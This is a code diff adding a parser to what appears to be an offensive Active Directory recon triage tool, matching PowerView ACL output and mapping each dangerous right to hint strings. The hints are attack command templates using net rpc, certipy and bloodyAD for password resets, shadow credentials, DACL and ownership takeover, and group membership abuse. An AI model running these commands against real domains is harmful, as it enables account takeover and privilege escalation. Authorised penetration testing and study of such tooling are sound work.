@@ -2899,6 +2899,24 @@ _PV_KERB = re.compile(
     r'(?i)samaccountname\s*:\s*(\S{1,40})[\s\S]{0,400}?'
     r'serviceprincipalname\s*:\s*(\S{4,120})'
 )
+# iter-267: PowerView `Get-DomainObjectAcl -ResolveGUIDs` block. Format:
+#   ObjectDN            : CN=svc_web,OU=Users,DC=corp,DC=local
+#   ActiveDirectoryRights : GenericAll
+#   SecurityIdentifier  : S-1-5-21-...-1104
+# The captured triple = (target DN, right, principal SID that HOLDS
+# the right). Feeds into R-ACL chain rules (ForceChangePassword,
+# shadow-cred via GenericWrite, group-add via AddSelf, etc.).
+# Only dangerous ACL rights that are directly abuse-primitives.
+_PV_ACL = re.compile(
+    r'(?is)ObjectDN\s*:\s*(CN=[^\r\n]{1,240}?)\s*[\r\n]+'
+    r'[\s\S]{0,800}?'
+    r'ActiveDirectoryRights\s*:\s*(GenericAll|GenericWrite|WriteDacl|'
+    r'WriteOwner|AllExtendedRights|ExtendedRight|WriteProperty|'
+    r'ForceChangePassword|AddSelf|WriteMember)\b'
+    r'[\s\S]{0,800}?'
+    r'SecurityIdentifier\s*:\s*(S-1-5-\d{1,3}(?:-\d{1,10}){1,10})\b'
+)
+_PV_ACL_BLEED = re.compile(r'(?i)^\s*ObjectDN\s*:', re.M)
 # cmdkey /list typed block
 _CMDKEY_LIST = re.compile(
     r'(?i)Target\s*:\s*Domain:target=([^\r\n]{3,80})[\s\S]{0,200}?'
@@ -6587,6 +6605,91 @@ def _multiline_passes(path, report, store):
         if store is not None:
             store.add(Evidence(kind="kerberoastable", user=u,
                                source=path, line=_ln(m)))
+
+    # iter-267: PowerView Get-DomainObjectAcl block. Captures the abuse
+    # triple (target DN, dangerous right, principal SID that holds it).
+    # Per-right hint routes to the concrete impacket / Certipy / bloodyAD
+    # exploit primitive. Doc-file gated. Cross-block bleed guard via
+    # _PV_ACL_BLEED (another ObjectDN between captures).
+    if not filters.is_doc_file(path):
+        _acl_seen = set()
+        for _am in _PV_ACL.finditer(text):
+            if not _no_bleed(_am, 1, 3, _PV_ACL_BLEED):
+                continue
+            _dn = _am.group(1).strip()
+            _right = _am.group(2)
+            _sid = _am.group(3)
+            _sig = (_dn[:100], _right, _sid)
+            if _sig in _acl_seen:
+                continue
+            _acl_seen.add(_sig)
+            # Extract CN=<name> for a friendlier label.
+            _cn_m = re.match(r'(?i)CN=([^,]{1,60})', _dn)
+            _tgt = _cn_m.group(1) if _cn_m else _dn[:60]
+            _tgt_sh = _tgt.replace("'", "'\\''")
+            _hint_map = {
+                "GenericAll": ("full control - reset pw: net rpc "
+                               f"password '{_tgt_sh}' <newpw> -U "
+                               f"'<abuse-user>%<pw>' -S <dc>  |  "
+                               "or shadow-cred: certipy shadow "
+                               "auto -account "
+                               f"'{_tgt_sh}' -u '<abuse-user>@<dom>'"
+                               " -p '<pw>'"),
+                "GenericWrite": ("shadow-cred (write msDS-KeyCred"
+                                 f"entialLink): certipy shadow auto "
+                                 f"-account '{_tgt_sh}' -u '<abuse-"
+                                 "user>@<dom>' -p '<pw>'  |  or SPN"
+                                 " abuse: set servicePrincipalName "
+                                 "then kerberoast"),
+                "WriteDacl": ("escalate to GenericAll: bloodyAD -u "
+                              "'<abuse-user>' -p '<pw>' -d <dom> "
+                              "add dacl-principal "
+                              f"'{_tgt_sh}' <abuse-user> --right "
+                              "GenericAll  |  then use GenericAll"),
+                "WriteOwner": ("take ownership then set WriteDacl: "
+                                "bloodyAD -u '<abuse-user>' -p "
+                                f"'<pw>' -d <dom> set owner "
+                                f"'{_tgt_sh}' '<abuse-user>'"),
+                "AllExtendedRights": ("password reset: net rpc "
+                                       f"password '{_tgt_sh}' "
+                                       "<newpw> -U '<abuse-user>%"
+                                       "<pw>' -S <dc>"),
+                "ExtendedRight": ("password reset possible - check "
+                                    "extended right GUID; if "
+                                    "User-Force-Change-Password: "
+                                    "net rpc password "
+                                    f"'{_tgt_sh}' <newpw> -U "
+                                    "'<abuse-user>%<pw>' -S <dc>"),
+                "WriteProperty": ("check property - if servicePrinci"
+                                    "palName: SPN abuse + kerberoast;"
+                                    " if msDS-AllowedTo(ActOnBehalf"
+                                    "|Delegate): RBCD attack"),
+                "ForceChangePassword": ("direct password reset: net "
+                                          f"rpc password '{_tgt_sh}'"
+                                          " <newpw> -U '<abuse-user>"
+                                          "%<pw>' -S <dc>"),
+                "AddSelf": ("add self to group: net rpc group "
+                             f"addmem '{_tgt_sh}' <abuse-user> -U "
+                             "'<abuse-user>%<pw>' -S <dc>  |  if "
+                             "target is Domain Admins - insta-DA"),
+                "WriteMember": ("add any user to group: net rpc "
+                                 f"group addmem '{_tgt_sh}' "
+                                 "<abuse-user> -U '<abuse-user>%<pw>'"
+                                 " -S <dc>"),
+            }
+            _hint = _hint_map.get(_right, "ACL abuse - check right")
+            _sev = "CRITICAL" if _tgt.lower() in (
+                "domain admins", "administrators", "enterprise "
+                "admins", "krbtgt", "administrator") else "HIGH"
+            report.add(_sev, "RECON", path, _ln(_am),
+                       f"ACL: SID {_sid[-6:]} has {_right} on {_tgt} "
+                       f"({_dn[:80]})",
+                       hint=_hint)
+            if store is not None:
+                store.add(Evidence(kind="acl", user=_tgt,
+                                   source=path, line=_ln(_am),
+                                   meta={"dn": _dn, "right": _right,
+                                         "principal_sid": _sid}))
 
     # cmdkey /list saved
     # iter-168: bleed guard - a cmdkey block missing its `User:` line
